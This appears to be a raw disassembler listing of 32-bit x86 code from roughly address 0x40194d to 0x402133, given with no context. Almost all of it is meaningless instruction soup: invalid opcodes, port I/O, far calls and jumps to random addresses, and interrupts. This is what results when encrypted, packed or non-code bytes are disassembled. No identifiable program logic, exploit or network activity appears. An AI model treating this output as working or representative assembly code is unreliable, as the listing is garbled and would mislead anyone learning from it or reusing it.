  40194d:	add    eax,0x809b8a01
  401952:	sub    BYTE PTR [ebp-0x67a0df6e],al
  401958:	fwait
  401959:	mov    bl,0x95
  40195b:	sub    DWORD PTR [edi+0x17],eax
  40195e:	xchg   esi,eax
  40195f:	mov    eax,ds:0x74ffbf78
  401964:	mov    eax,ds:0x8bccd64c
  401969:	adc    bl,cl
  40196b:	jb     0x4019ea
  40196d:	push   0xffffffb6
  40196f:	in     al,0x4c
  401971:	pop    ds
  401972:	scas   al,BYTE PTR es:[edi]
  401973:	mov    ds:0x5281669,eax
  401978:	mov    al,ds:0xfefddd27
  40197d:	mov    ebp,0x64c88821
  401982:	inc    edx
  401983:	or     edx,DWORD PTR [eax+0x25c2ae01]
  401989:	fisubr DWORD PTR [edx]
  40198b:	mov    bh,BYTE PTR [ebx+0x1eaff794]
  401991:	push   0x21051461
  401996:	mov    ch,0x66
  401998:	jmp    0xeb22f855
  40199d:	or     ebp,DWORD PTR [ecx+0x2dc6ea89]
  4019a3:	xchg   BYTE PTR [eax],ah
  4019a5:	xor    eax,esi
  4019a7:	test   ax,0xf3a0
  4019ab:	mov    ebp,0x40bb21ed
  4019b0:	scas   al,BYTE PTR es:[edi]
  4019b1:	iret   
  4019b2:	sub    bh,BYTE PTR [edx+0x79]
  4019b5:	call   edi
  4019b7:	ret    
  4019b8:	imul   ebp,DWORD PTR [edx+eax*4],0x1f
  4019bc:	dec    edx
  4019bd:	mov    esp,0xa8a29831
  4019c2:	adc    ch,ah
  4019c4:	ja     0x401a1e
  4019c6:	jbe    0x401a08
  4019c8:	(bad)  
  4019c9:	out    0x90,eax
  4019cb:	xor    al,0x93
  4019cd:	inc    ebx
  4019ce:	mov    ?,esp
  4019d0:	out    dx,eax
  4019d1:	daa    
  4019d2:	xchg   esi,eax
  4019d3:	xor    eax,0x780f49b2
  4019d8:	adc    BYTE PTR [edx+0x71],0xa0
  4019dc:	pop    esi
  4019de:	iret   
  4019df:	lahf   
  4019e0:	sbb    BYTE PTR [esi-0x73],dl
  4019e3:	shl    DWORD PTR [ecx-0x266d64d5],0x9d
  4019ea:	cmp    BYTE PTR ds:0xee88cf5d,0x2e
  4019f1:	aaa    
  4019f2:	mov    edx,0x7b3ae03d
  4019f7:	sub    cl,bh
  4019f9:	xchg   ebp,eax
  4019fa:	pop    esp
  4019fb:	into   
  4019fc:	shl    BYTE PTR [ebx-0x6e],1
  4019ff:	mov    cl,0x8f
  401a01:	test   al,0x96
  401a03:	movaps xmm3,xmm4
  401a06:	int3   
  401a07:	out    dx,al
  401a08:	xchg   esp,eax
  401a09:	cmc    
  401a0a:	mov    WORD PTR [edx],gs
  401a0c:	std    
  401a0d:	sbb    bh,cl
  401a0f:	cmp    bl,BYTE PTR [ebx]
  401a11:	sub    edx,ecx
  401a13:	out    0xb1,al
  401a15:	pshufw mm5,QWORD PTR [esi],0x16
  401a19:	dec    eax
  401a1a:	rol    BYTE PTR [ebx],1
  401a1c:	enter  0x2f2c,0x90
  401a20:	call   0x3cff:0x66357374
  401a27:	mov    ss,WORD PTR [ebp-0x77]
  401a2a:	es xchg ebx,eax
  401a2c:	sbb    eax,0x815b343f
  401a31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a32:	jecxz  0x401a59
  401a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a35:	xor    DWORD PTR [esi],ebx
  401a37:	sbb    al,0x55
  401a39:	ja     0x401a02
  401a3b:	jo     0x401a16
  401a3d:	jge    0x401aa2
  401a3f:	frstor [ecx]
  401a41:	dec    dl
  401a43:	call   0xd5c4:0x62b01150
  401a4a:	push   0xfffffff4
  401a4c:	or     eax,0xfc7a8b83
  401a51:	int3   
  401a52:	pop    edx
  401a53:	mov    bl,0x7c
  401a55:	adc    eax,0xc0bdba59
  401a5a:	outs   dx,BYTE PTR ds:[esi]
  401a5b:	out    0x10,eax
  401a5d:	dec    ecx
  401a5e:	mov    BYTE PTR [edi-0xe48de89],bl
  401a64:	outs   dx,DWORD PTR ds:[esi]
  401a65:	cmp    ch,BYTE PTR [edi]
  401a67:	(bad)  [ebx+0x2e]
  401a6a:	and    al,0x47
  401a6c:	outs   dx,DWORD PTR ds:[esi]
  401a6e:	loop   0x401acf
  401a70:	xchg   esp,eax
  401a71:	fsubr  st,st(2)
  401a73:	cmp    WORD PTR [edi],0x583c
  401a78:	push   ebx
  401a79:	out    0x94,al
  401a7b:	(bad)  
  401a7c:	clc    
  401a7d:	cmp    esi,0x7d
  401a80:	mov    bl,0xcc
  401a82:	mov    ebp,0xaff6aa4
  401a87:	aad    0x2d
  401a89:	xchg   edx,eax
  401a8a:	dec    ebx
  401a8b:	gs and eax,0x4c265c29
  401a91:	push   ds
  401a92:	or     al,0x68
  401a94:	call   0xce1f:0x6c64fadd
  401a9b:	add    ebp,ebp
  401a9d:	addr16 xchg ebp,eax
  401a9f:	cmp    eax,esi
  401aa1:	mov    ds:0x4e7f3620,al
  401aa6:	test   BYTE PTR [esi+edx*8-0x31],0xff
  401aab:	les    ebx,FWORD PTR [ebp-0x43039a0]
  401ab1:	rcr    ebx,1
  401ab3:	aam    0x19
  401ab5:	sub    ah,ah
  401ab7:	dec    esi
  401ab8:	push   ebp
  401ab9:	push   0xffffffdf
  401abb:	push   ebp
  401abc:	(bad)  
  401abd:	das    
  401abe:	sub    eax,DWORD PTR [edx+0x31d2e59d]
  401ac4:	test   al,0x92
  401ac6:	int    0xd0
  401ac8:	mov    al,0xc8
  401aca:	and    BYTE PTR [ebx],cl
  401acc:	hlt    
  401acd:	and    DWORD PTR [ebx+0x1f],ecx
  401ad0:	nop
  401ad1:	pop    ds
  401ad2:	stc    
  401ad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ad4:	adc    al,0x67
  401ad6:	mov    dh,0xfe
  401ad8:	clc    
  401ad9:	push   edx
  401ada:	and    ecx,DWORD PTR [ebp*1+0x780a8f1c]
  401ae1:	mov    al,0x2e
  401ae3:	call   0x899e:0xab63e55e
  401aea:	cmp    al,0x33
  401aec:	push   edi
  401aed:	push   bx
  401aef:	or     eax,0xb4670fdb
  401af4:	add    al,0x70
  401af6:	iret   
  401af7:	xchg   ecx,eax
  401af8:	xlat   BYTE PTR ds:[ebx]
  401af9:	jmp    0x76b5edd4
  401afe:	mov    ch,0xaa
  401b00:	inc    ecx
  401b01:	or     BYTE PTR [ecx-0x4a0bba98],0x5a
  401b08:	xchg   esi,eax
  401b09:	fstp   QWORD PTR [eax+0x11]
  401b0c:	cmp    esi,0x5ca2108e
  401b12:	mov    dh,0xa9
  401b14:	pop    ds
  401b15:	adc    BYTE PTR [edi],bh
  401b17:	adc    al,0xa
  401b19:	rcl    DWORD PTR [ebx-0x4c0aecec],1
  401b1f:	xchg   edx,eax
  401b20:	pop    eax
  401b21:	sub    DWORD PTR [ebp-0x7e261cc4],esi
  401b27:	inc    ebp
  401b28:	es call 0x3cef:0x29de4fad
  401b30:	sbb    al,0x12
  401b32:	mov    ebx,0xc262c53f
  401b37:	in     eax,0x52
  401b39:	or     al,0xb9
  401b3b:	les    ecx,FWORD PTR [edx+0x63]
  401b3e:	lods   al,BYTE PTR ds:[esi]
  401b3f:	dec    esi
  401b40:	dec    edi
  401b41:	xor    BYTE PTR [esi+0x451c8688],dh
  401b47:	test   eax,0xa0e5564b
  401b4c:	sbb    BYTE PTR [ebp+0x54311c1d],ch
  401b52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b53:	xor    eax,0x66693b47
  401b58:	pop    edx
  401b59:	in     al,0x25
  401b5b:	ss stos BYTE PTR es:[edi],al
  401b5d:	adc    BYTE PTR [esi-0x42899f85],cl
  401b63:	std    
  401b64:	gs add ecx,ecx
  401b67:	jmp    0x73c7:0x412c53bc
  401b6e:	cmp    al,0x63
  401b71:	mov    cl,0xa7
  401b73:	cmp    al,0x60
  401b75:	cwde   
  401b76:	nop
  401b77:	jb     0x401b80
  401b79:	pop    ss
  401b7a:	stos   DWORD PTR es:[edi],eax
  401b7b:	inc    esi
  401b7c:	ss jnp 0x401b87
  401b7f:	aas    
  401b80:	pop    edx
  401b81:	out    dx,al
  401b82:	scas   eax,DWORD PTR es:[edi]
  401b83:	mov    cl,0xec
  401b85:	scas   eax,DWORD PTR es:[edi]
  401b86:	dec    ebx
  401b87:	test   BYTE PTR [esi-0x56343a9e],cl
  401b8d:	sbb    eax,0x646c38b
  401b92:	shr    BYTE PTR [ebp+0x37],1
  401b95:	ss push edx
  401b97:	mov    al,0xb1
  401b99:	fdiv   QWORD PTR [eax]
  401b9b:	out    dx,al
  401b9c:	jne    0x401c12
  401b9e:	test   DWORD PTR [ebx],esp
  401ba0:	inc    esi
  401ba1:	out    dx,eax
  401ba2:	lea    edi,[edx+0x4f716e34]
  401ba8:	and    al,0x61
  401baa:	mov    WORD PTR [ebx-0x6839188e],cs
  401bb0:	mov    ecx,0x7e440ba1
  401bb5:	xor    eax,DWORD PTR [esi+0x14]
  401bb8:	cmp    al,0x40
  401bba:	inc    edi
  401bbb:	push   edx
  401bbc:	stos   DWORD PTR es:[edi],eax
  401bbd:	xor    BYTE PTR [esp+ebx*4+0x5a],al
  401bc1:	jg     0x401c1e
  401bc3:	cli    
  401bc4:	repz mov bl,0xab
  401bc7:	aas    
  401bc8:	jnp    0x401b58
  401bca:	sub    DWORD PTR [eax-0x6f],0x1199751d
  401bd1:	out    0xae,eax
  401bd3:	fbld   TBYTE PTR [ebp-0x2e01fa0e]
  401bd9:	mov    edi,0x4dbb1415
  401bde:	sbb    eax,0xa7513c7
  401be3:	or     ebx,DWORD PTR [edx]
  401be5:	sbb    DWORD PTR ds:0xecbc66c3,edi
  401beb:	jne    0x401bd9
  401bed:	aad    0x80
  401bef:	gs xchg esi,eax
  401bf1:	adc    bl,bh
  401bf3:	bound  edx,QWORD PTR [ebp+0x7c]
  401bf6:	and    DWORD PTR [eax+0x240e4f8b],eax
  401bfc:	adc    dh,dh
  401bfe:	ss xchg edx,eax
  401c00:	sub    eax,0x91d2cf37
  401c05:	xor    edx,DWORD PTR [ebp+0x70]
  401c08:	adc    al,0x1
  401c0a:	ss addr16 (bad) 
  401c0d:	loop   0x401c2a
  401c0f:	data16 mov bl,0xb4
  401c12:	popf   
  401c13:	sub    al,0x39
  401c15:	sub    eax,0x104cce68
  401c1a:	(bad)  
  401c1b:	int3   
  401c1c:	aaa    
  401c1d:	xchg   edi,eax
  401c1e:	jne    0x401c98
  401c20:	jge    0x401ba4
  401c22:	xor    ecx,esi
  401c24:	mov    edx,0xffcd8d66
  401c29:	sub    edx,ecx
  401c2b:	add    DWORD PTR [eax],edx
  401c2d:	jmp    0x401f33
  401c32:	call   0xbda4cdad
  401c37:	addr16 cmc 
  401c39:	jb     0x401c6b
  401c3b:	popa   
  401c3c:	xchg   ecx,eax
  401c3d:	and    eax,0x12dca85c
  401c42:	mov    cl,0x4
  401c44:	jl     0x401cc2
  401c46:	addr16 jle 0x401cc5
  401c49:	jl     0x401ca4
  401c4b:	push   esp
  401c4c:	sbb    al,ah
  401c4e:	loop   0x401bfd
  401c50:	xchg   ebp,eax
  401c51:	leave  
  401c52:	dec    ebx
  401c53:	cld    
  401c54:	add    BYTE PTR [ebp+0xb4b05],ah
  401c5a:	gs mov ecx,0xf719d621
  401c60:	(bad)
  401c63:	and    BYTE PTR [ecx-0x3b8929b],al
  401c69:	and    al,0xac
  401c6b:	dec    ebp
  401c6c:	mov    bl,0x6e
  401c6e:	push   edx
  401c6f:	mov    eax,0xcc96e739
  401c74:	(bad)  
  401c75:	test   BYTE PTR [eax-0x17],0xdc
  401c79:	mov    eax,ds:0x61dfa514
  401c7e:	push   es
  401c7f:	fisub  WORD PTR [esp+ebp*8-0x4c920a29]
  401c86:	aam    0x97
  401c88:	cmp    ebp,ebp
  401c8a:	sub    cl,BYTE PTR [esi-0x224e1823]
  401c90:	jmp    0x401cfd
  401c92:	push   es
  401c93:	fwait
  401c94:	cs jecxz 0x401c3a
  401c97:	mov    ecx,0x5ba68139
  401c9c:	push   ds
  401c9d:	jmp    FWORD PTR [eax+0x31]
  401ca0:	stc    
  401ca1:	out    dx,al
  401ca2:	lock fs dec eax
  401ca5:	into   
  401ca6:	mov    edi,0xbf9693a7
  401cab:	inc    esi
  401cac:	pop    ds
  401cad:	push   esp
  401cae:	int    0x1a
  401cb0:	or     eax,0x93f7a00e
  401cb5:	xor    eax,0x74b0cc27
  401cba:	sub    DWORD PTR [eax-0x2b],edi
  401cbd:	dec    ecx
  401cbe:	in     eax,dx
  401cbf:	mov    eax,ds:0x5c8bf0c1
  401cc4:	hlt    
  401cc5:	rcl    DWORD PTR [eax+0x2262bbdb],cl
  401ccb:	push   cs
  401ccc:	push   0xc4cad896
  401cd1:	jmp    0x8db3e148
  401cd6:	mov    ecx,0xdea80d1c
  401cdb:	and    eax,0x7b2620e7
  401ce0:	test   BYTE PTR [edi-0x95a5426],al
  401ce6:	sub    al,BYTE PTR [eax]
  401ce8:	add    al,0x52
  401cea:	cld    
  401ceb:	mov    BYTE PTR [edx-0x1471f93c],ah
  401cf1:	iret   
  401cf2:	or     BYTE PTR ds:0x12694bc,0x7a
  401cf9:	adc    BYTE PTR [ebp+0x25287af3],al
  401cff:	stc    
  401d00:	cmp    al,bh
  401d02:	dec    edx
  401d03:	test   al,0xed
  401d05:	rcr    DWORD PTR [esi],cl
  401d07:	xor    al,0x1f
  401d09:	in     al,dx
  401d0a:	push   0x2c
  401d0c:	call   0xff2d:0x57b2f0b3
  401d13:	fs push es
  401d15:	and    eax,0x92ba6487
  401d1a:	jle    0x401d06
  401d1c:	jp     0x401cf9
  401d1e:	repnz and eax,0xbcc9c9e7
  401d24:	mov    ch,0x7c
  401d26:	jmp    0x401da4
  401d28:	mov    bh,BYTE PTR [edi+0x2f991299]
  401d2e:	js     0x401d1c
  401d30:	shr    BYTE PTR [edx-0x5a],1
  401d33:	pop    eax
  401d34:	leave  
  401d35:	push   edi
  401d36:	(bad)  
  401d37:	cmp    eax,0x87aed776
  401d3c:	xchg   edx,eax
  401d3d:	xchg   ecx,eax
  401d3e:	inc    edx
  401d3f:	mov    edi,0x3e4dd8b3
  401d44:	xor    eax,0x37b158f
  401d49:	sub    BYTE PTR [ebx-0x4dc5fb57],ah
  401d4f:	gs jmp 0xfd6f:0x74156f0c
  401d57:	das    
  401d58:	daa    
  401d59:	jg     0x401cea
  401d5b:	aam    0x57
  401d5d:	add    cl,BYTE PTR [eax+0x0]
  401d60:	int    0x39
  401d62:	shl    esp,cl
  401d64:	pop    ebx
  401d65:	pop    ds
  401d66:	bnd jo 0x401d50
  401d69:	cwde   
  401d6a:	ror    ch,cl
  401d6c:	jbe    0x401d5e
  401d6e:	test   BYTE PTR [ebp+0x69],ah
  401d71:	push   esp
  401d72:	test   DWORD PTR [ebx-0x2d],ebx
  401d75:	jnp    0x401d10
  401d77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d78:	addr16 mov ebp,0x8468aa1f
  401d7e:	cwde   
  401d7f:	mov    ecx,0x91534d75
  401d84:	sub    BYTE PTR [esi],ah
  401d86:	fst    st(0)
  401d88:	leave  
  401d89:	fs data16 aas 
  401d8c:	js     0x401db7
  401d8e:	hlt    
  401d8f:	out    0x5,eax
  401d91:	inc    esi
  401d92:	pop    es
  401d93:	lods   eax,DWORD PTR ds:[esi]
  401d94:	xor    dh,ah
  401d96:	jb     0x401d1a
  401d98:	js     0x401e10
  401d9a:	or     BYTE PTR [ecx-0x226e19b3],ah
  401da0:	sub    esi,0x1d8ffcad
  401da6:	(bad)  
  401da7:	or     eax,esp
  401da9:	test   DWORD PTR [eiz*4-0x5f3d3658],0x4d276168
  401db4:	xchg   ebp,eax
  401db5:	imul   esp,esp,0xffffffb4
  401db8:	add    DWORD PTR [ebp-0x6326aee8],eax
  401dbe:	jne    0x401e28
  401dc0:	mov    ecx,0xe335d3b5
  401dc5:	clc    
  401dc6:	not    BYTE PTR [ecx+0x51]
  401dc9:	inc    ebx
  401dca:	mov    ch,0x55
  401dcc:	outs   dx,DWORD PTR ds:[esi]
  401dcd:	lock pop edi
  401dcf:	data16 mov dl,0x9f
  401dd2:	cmc    
  401dd3:	push   ecx
  401dd4:	mov    BYTE PTR [eax+0x70],ch
  401dd7:	cwde   
  401dd8:	test   BYTE PTR [ebx+0x45],al
  401ddb:	js     0x401da1
  401ddd:	shl    bh,0x32
  401de0:	(bad)  
  401de1:	adc    edi,DWORD PTR [ebp-0x1cbf42ba]
  401de7:	popf   
  401de8:	sahf   
  401de9:	xor    BYTE PTR [ebp+0x1],dl
  401dec:	scas   eax,DWORD PTR es:[edi]
  401ded:	lock cmp al,0xa0
  401df0:	cli    
  401df1:	mov    cs,esi
  401df3:	jg     0x401d9e
  401df5:	add    BYTE PTR [ecx-0x125fc3db],cl
  401dfb:	dec    ecx
  401dfc:	mov    bl,dl
  401dfe:	cwde   
  401dff:	js     0x401dac
  401e01:	sbb    BYTE PTR [eax],dh
  401e03:	push   eax
  401e04:	pop    ds
  401e05:	jne    0x401e0e
  401e07:	push   esp
  401e08:	dec    edi
  401e09:	stos   DWORD PTR es:[edi],eax
  401e0a:	cmp    al,0xd5
  401e0c:	cmp    dl,bl
  401e0e:	pushf  
  401e0f:	and    ebp,esp
  401e11:	loope  0x401e8a
  401e13:	fadd   QWORD PTR [eax-0xe]
  401e16:	cmp    edx,0x57
  401e19:	pop    ebx
  401e1a:	adc    BYTE PTR [esi-0x59b996b2],bl
  401e20:	jo     0x401df8
  401e22:	nop
  401e23:	jbe    0x401dd8
  401e25:	aad    0x2d
  401e27:	cvtdq2ps xmm1,xmm4
  401e2a:	outs   dx,DWORD PTR ds:[esi]
  401e2b:	icebp  
  401e2c:	and    eax,0x5c96e521
  401e31:	dec    ecx
  401e32:	mov    edx,0xee3d8e87
  401e37:	mov    ds:0xb25d14f1,al
  401e3c:	cli    
  401e3d:	sub    al,0x2c
  401e3f:	ret    
  401e40:	cmp    ebp,DWORD PTR [esi-0x39]
  401e43:	pop    DWORD PTR [esi-0x45fae466]
  401e49:	popf   
  401e4a:	sub    edx,DWORD PTR [esi]
  401e4c:	repz add DWORD PTR [ebp-0x45],edi
  401e50:	mov    ebx,0x62c55a
  401e55:	mov    ch,0x78
  401e57:	and    al,0x64
  401e59:	das    
  401e5a:	stc    
  401e5b:	xchg   esp,eax
  401e5c:	int3   
  401e5d:	aad    0xdc
  401e5f:	rcl    al,cl
  401e61:	dec    edx
  401e62:	arpl   WORD PTR [edi-0x10],ax
  401e65:	out    dx,al
  401e66:	lds    edx,FWORD PTR [eax+0x25dd84d2]
  401e6c:	or     BYTE PTR [ebx+0x18a6617b],dh
  401e72:	pop    esi
  401e73:	lods   eax,DWORD PTR ds:[esi]
  401e74:	in     al,0x28
  401e76:	icebp  
  401e77:	pop    es
  401e78:	imul   ebx,DWORD PTR [edi-0x555f58d2],0xffffffd9
  401e7f:	(bad)  
  401e80:	push   ebx
  401e81:	(bad)  
  401e82:	out    0x3d,eax
  401e84:	sub    al,0x4d
  401e86:	jmp    0xe808df40
  401e8b:	loopne 0x401e96
  401e8d:	adc    ebp,DWORD PTR [ebp+eax*2+0x2a]
  401e91:	add    al,0xb4
  401e93:	nop
  401e94:	imul   BYTE PTR [ecx]
  401e96:	(bad)  
  401e97:	mov    edi,0x33ba8637
  401e9c:	ins    DWORD PTR es:[edi],dx
  401e9d:	and    DWORD PTR [ecx],ecx
  401e9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ea0:	adc    DWORD PTR [edx-0x2a],esi
  401ea3:	js     0x401ee5
  401ea5:	out    0x8e,eax
  401ea7:	test   al,0x8f
  401ea9:	popf   
  401eaa:	ret    0x90b2
  401ead:	inc    esp
  401eae:	inc    edi
  401eaf:	cwde   
  401eb0:	mov    DWORD PTR ds:0xe9f7289a,edi
  401eb6:	in     eax,0x2e
  401eb8:	shl    BYTE PTR [ecx],cl
  401eba:	xchg   edx,eax
  401ebb:	lods   eax,DWORD PTR ds:[esi]
  401ebc:	aad    0xe
  401ebe:	arpl   dx,bp
  401ec0:	out    0x7c,eax
  401ec2:	push   eax
  401ec3:	jle    0x401ead
  401ec5:	shl    esi,0xf9
  401ec8:	(bad)  
  401ec9:	pop    esi
  401eca:	cld    
  401ecb:	mov    al,0xc9
  401ecd:	dec    esp
  401ece:	jmp    0x718e237c
  401ed3:	dec    ecx
  401ed4:	or     BYTE PTR [ecx+eiz*4-0x53be3163],ah
  401edb:	aad    0x25
  401edd:	bound  ebx,QWORD PTR [eax-0x13]
  401ee0:	jno    0x401f55
  401ee2:	lods   al,BYTE PTR ds:[esi]
  401ee3:	or     DWORD PTR ds:0xa658d351,ebp
  401ee9:	dec    ebp
  401eea:	xchg   esp,eax
  401eeb:	leave  
  401eec:	mov    cs,ebp
  401eee:	fisttp QWORD PTR [ecx]
  401ef0:	mov    DWORD PTR [eax-0x18],esi
  401ef3:	div    BYTE PTR ds:0xc4a17020
  401ef9:	dec    esp
  401efa:	dec    edi
  401efb:	inc    esp
  401efc:	and    eax,0x14d23a6b
  401f01:	je     0x401f11
  401f03:	and    edi,ebp
  401f05:	inc    ebp
  401f06:	pusha  
  401f07:	xor    ah,al
  401f09:	cs push ebp
  401f0b:	cmp    eax,0xc757d29e
  401f10:	xchg   DWORD PTR [eax],ecx
  401f12:	into   
  401f13:	ret    
  401f14:	data16 std 
  401f16:	and    dh,cl
  401f18:	dec    eax
  401f19:	ins    BYTE PTR es:[di],dx
  401f1b:	inc    bh
  401f1d:	inc    ebp
  401f1e:	stos   BYTE PTR es:[edi],al
  401f1f:	cmp    ebp,esi
  401f21:	push   cs
  401f22:	in     al,0x44
  401f24:	repz (bad) 
  401f26:	and    dl,ch
  401f28:	dec    edi
  401f29:	xchg   ebp,eax
  401f2a:	dec    edi
  401f2b:	aad    0x48
  401f2d:	or     BYTE PTR [edx],0xea
  401f30:	cmp    edi,DWORD PTR ds:0x3beaa17d
  401f36:	inc    ecx
  401f37:	add    BYTE PTR [ebx+0x4d8b6600],cl
  401f3d:	cld    
  401f3e:	movzx  ecx,cx
  401f41:	add    ecx,DWORD PTR [eax]
  401f43:	mov    DWORD PTR [ebp-0x18],ecx
  401f46:	mov    eax,DWORD PTR [ebp+0xc]
  401f49:	jmp    0x40224f
  401f4e:	adc    BYTE PTR [ebx+0x52c9c8c9],0x8d
  401f55:	pop    ebp
  401f56:	and    DWORD PTR [ebp-0x67],0x12c9c450
  401f5d:	fcomp  DWORD PTR [eax+0x677c7c01]
  401f63:	jle    0x401fe1
  401f65:	jl     0x401f03
  401f67:	pop    es
  401f68:	pop    edi
  401f69:	sub    esi,DWORD PTR [ebp-0x44]
  401f6c:	add    esp,DWORD PTR [esi]
  401f6e:	inc    esp
  401f6f:	pushf  
  401f70:	push   esp
  401f71:	aaa    
  401f72:	mov    BYTE PTR [esi-0x79],al
  401f75:	jno    0x401f06
  401f77:	xor    esi,ebp
  401f79:	mov    ss,WORD PTR [edi]
  401f7b:	and    eax,0x3238e5a0
  401f80:	out    dx,al
  401f81:	test   DWORD PTR [ebx-0x3d0a3c7e],edi
  401f87:	(bad)  
  401f88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f89:	inc    esi
  401f8a:	jecxz  0x401f35
  401f8c:	push   cs
  401f8d:	fdiv   QWORD PTR [eax-0x72fe6e40]
  401f93:	sbb    eax,0xf543e95a
  401f98:	add    al,0x7d
  401f9a:	scas   eax,DWORD PTR es:[edi]
  401f9b:	and    DWORD PTR [eax+0x10],0x10
  401f9f:	push   cs
  401fa0:	jl     0x401f32
  401fa2:	mov    edx,0x19165cfe
  401fa7:	rcr    BYTE PTR [ecx+edi*2-0x69],0x6c
  401fac:	enter  0x8590,0x25
  401fb0:	imul   ebp,DWORD PTR [edi],0x49cdf4fc
  401fb6:	rol    BYTE PTR [edx],cl
  401fb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fb9:	stos   BYTE PTR es:[edi],al
  401fba:	mov    ds:0x891f0de4,eax
  401fbf:	inc    esi
  401fc0:	adc    eax,0x86a223cc
  401fc5:	adc    BYTE PTR [edx-0x1f],cl
  401fc8:	pusha  
  401fc9:	in     al,dx
  401fca:	push   ebp
  401fcb:	std    
  401fcc:	add    dh,BYTE PTR [ebx-0x4002cb4]
  401fd2:	retf   
  401fd3:	sbb    BYTE PTR [eax-0x23],dh
  401fd6:	mov    esi,0x230cb0e2
  401fdb:	pop    edx
  401fdc:	nop
  401fdd:	cmp    DWORD PTR [esi],ebp
  401fdf:	outs   dx,DWORD PTR ds:[esi]
  401fe0:	mov    ds:0xca737455,al
  401fe5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fe6:	cmp    al,0x3
  401fe8:	mov    cl,0xfe
  401fea:	sub    al,0xb6
  401fec:	mov    edi,0xa27e03b7
  401ff1:	mov    WORD PTR [eax+0x2a],gs
  401ff4:	leave  
  401ff5:	outs   dx,BYTE PTR ds:[esi]
  401ff6:	clc    
  401ff7:	xor    dl,bh
  401ff9:	pop    ebx
  401ffa:	push   edi
  401ffb:	xchg   BYTE PTR [edi],al
  401ffd:	mov    edi,0x1539960
  402002:	ja     0x402029
  402004:	clc    
  402005:	inc    edi
  402006:	pusha  
  402007:	sbb    eax,0x77f8e7ce
  40200c:	aas    
  40200d:	push   eax
  40200e:	into   
  40200f:	in     eax,0x46
  402011:	outs   dx,BYTE PTR ds:[esi]
  402012:	imul   esi
  402014:	or     bh,BYTE PTR [bx]
  402017:	out    0xa6,eax
  402019:	or     al,dl
  40201b:	je     0x40207c
  40201d:	inc    esp
  40201e:	repz mov eax,ds:0x8b44a7f4
  402024:	sub    eax,0x9b54510a
  402029:	cmp    cl,BYTE PTR [ecx-0x4d]
  40202c:	add    al,0x9e
  40202e:	dec    edi
  40202f:	fcomi  st,st(5)
  402031:	sahf   
  402032:	fld1   
  402034:	pop    esi
  402035:	loope  0x401fe0
  402037:	fmul   st,st(1)
  402039:	push   ss
  40203a:	push   ebx
  40203b:	jns    0x40208b
  40203d:	jmp    0x8d2d6127
  402042:	sar    BYTE PTR [esi-0x1f],cl
  402045:	shr    DWORD PTR [ebx-0x2d],1
  402048:	sub    BYTE PTR [ecx],cl
  40204a:	out    dx,eax
  40204b:	hlt    
  40204c:	push   esp
  40204d:	mov    DWORD PTR [edx-0x37],esi
  402050:	jmp    0x2dcd:0xe613ced
  402057:	lods   eax,DWORD PTR ds:[esi]
  402058:	mov    bh,dh
  40205a:	cld    
  40205b:	(bad)  
  40205c:	mov    edx,0x2e997bf6
  402061:	mov    ecx,0x5b0baaeb
  402066:	cmp    edi,DWORD PTR [ecx+0x7edb40e9]
  40206c:	mov    BYTE PTR [ecx],0x53
  40206f:	or     al,0x39
  402071:	inc    ecx
  402072:	pop    edi
  402073:	ret    
  402074:	loope  0x40203c
  402076:	xchg   ecx,eax
  402077:	js     0x402099
  402079:	sbb    eax,0xc8e9d96c
  40207e:	mov    ebx,0xc6299809
  402083:	jns    0x4020dc
  402085:	cmp    eax,DWORD PTR [ebp-0x5a77fd25]
  40208b:	lods   al,BYTE PTR ds:[esi]
  40208c:	push   0xffffff8e
  40208e:	xchg   ebx,eax
  40208f:	xchg   edx,eax
  402090:	out    dx,eax
  402091:	shl    BYTE PTR [eax+ebx*1-0x3c],1
  402095:	lds    esi,FWORD PTR [ebx]
  402097:	xchg   esp,eax
  402098:	jns    0x4020a0
  40209a:	(bad)  [ecx-0x43]
  40209d:	fsub   QWORD PTR [ebp-0x6d]
  4020a0:	aam    0xb5
  4020a2:	addr16 adc ecx,esi
  4020a5:	adc    eax,0x8e1ce022
  4020aa:	pop    es
  4020ab:	jne    0x4020db
  4020ad:	pop    eax
  4020ae:	adc    DWORD PTR [edx+0x1f],ebp
  4020b1:	lds    edx,FWORD PTR [ebx-0x48]
  4020b4:	jecxz  0x4020ea
  4020b6:	or     ebp,edx
  4020b8:	adc    al,0xa6
  4020ba:	cmp    dl,BYTE PTR [ebx]
  4020bc:	xor    BYTE PTR [edx-0x6a0ff281],cl
  4020c2:	imul   ebx,ebx,0xffffffa6
  4020c5:	cmp    BYTE PTR [edi],bl
  4020c7:	sub    ch,BYTE PTR [ebx-0x7f45d4e9]
  4020cd:	dec    eax
  4020ce:	dec    ecx
  4020cf:	mov    WORD PTR [eax+0x6d35822f],cs
  4020d5:	jle    0x4020de
  4020d7:	jnp    0x4020b9
  4020d9:	cmp    BYTE PTR [esp+eax*2+0x1463972f],0x5a
  4020e1:	or     ah,BYTE PTR [eax+0x7c]
  4020e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020e5:	call   0x9e0d:0xcb74dfef
  4020ec:	inc    ebp
  4020ed:	mov    al,ds:0x87c503d2
  4020f2:	call   0x669a:0xb064e7d8
  4020f9:	test   eax,0xc47159be
  4020fe:	mov    bh,0xfa
  402100:	jo     0x40210c
  402102:	stc    
  402103:	sub    BYTE PTR [edx],dl
  402105:	arpl   WORD PTR [edx+ebx*2-0x688d100a],di
  40210c:	jns    0x402188
  40210e:	mov    al,0xb6
  402110:	cmp    al,0xf5
  402112:	push   0x61fa189
  402117:	mov    dl,cl
  402119:	ja     0x402138
  40211b:	cmp    DWORD PTR [ebp+0x35],0x1
  40211f:	sub    al,0x4f
  402121:	loope  0x402137
  402123:	rol    eax,cl
  402125:	stos   DWORD PTR es:[edi],eax
  402126:	out    dx,al
  402127:	inc    ebx
  402128:	and    BYTE PTR [ebx+0x63],dl
  40212b:	mov    ebx,0x5375930
  402130:	adc    BYTE PTR [edx],dh
  402132:	pop    ds
  402133:	imul   ebp,ecx,0xffffff82
